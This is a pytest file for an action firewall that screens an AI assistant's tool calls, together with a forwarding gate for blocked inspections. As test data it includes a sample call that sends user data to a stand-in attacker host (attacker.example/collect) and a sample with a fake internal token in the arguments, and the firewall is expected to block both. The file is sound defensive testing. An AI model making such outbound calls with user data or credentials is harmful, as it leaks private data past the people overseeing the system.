"""Tests for Module J and Module K: Action Firewall and Controlled Forwarding."""

import pytest
from backend.app.action_firewall import check_action
from backend.app.forwarding import run_assistant_for_inspection
from backend.app.storage import save_inspection

def test_action_firewall_blocks_unauthorized_destination():
    res = check_action(
        tool_name="send_external_http",
        tool_args={"url": "https://attacker.example/collect", "payload": "user_data"},
        target_destination="https://attacker.example/collect"
    )
    assert res["action_allowed"] is False
    assert res["decision"] == "BLOCK"
    assert "AFW-DEST-005" in res["violating_rule"]

def test_action_firewall_blocks_protected_token_in_arguments():
    res = check_action(
        tool_name="send_external_http",
        tool_args={"url": "https://api.company.internal/post", "token": "DEMO_INTERNAL_TOKEN_4821"},
        target_destination="https://api.company.internal/post"
    )
    assert res["action_allowed"] is False
    assert res["decision"] == "BLOCK"
    assert "AFW-DATA-004" in res["violating_rule"]
    assert "protected system credential" in res["reason"]

def test_action_firewall_permits_authorized_operation():
    res = check_action(
        tool_name="send_external_http",
        tool_args={"url": "https://api.company.internal/health", "data": "ping"},
        target_destination="https://api.company.internal/health"
    )
    assert res["action_allowed"] is True
    assert res["decision"] == "ALLOW"

def test_controlled_forwarding_rejects_blocked_inspection():
    test_id = "insp_test_blocked_forwarding"
    save_inspection({
        "inspection_id": test_id,
        "task": "Test task",
        "original_content": "Attack payload",
        "source_type": "User Prompt",
        "decision": "BLOCK",
        "summary_explanation": "Blocked",
        "forwarding_permitted": False,
        "triggered_policy": "POL-001",
        "triggered_rules": [],
        "risk_scores": {},
        "normalization": {},
        "ml_result": {},
        "intent_analysis": {},
        "decision_steps": []
    })

    result = run_assistant_for_inspection(test_id)
    assert result["success"] is False
    assert result["status"] == "blocked"
    assert result["assistant_output"] is None
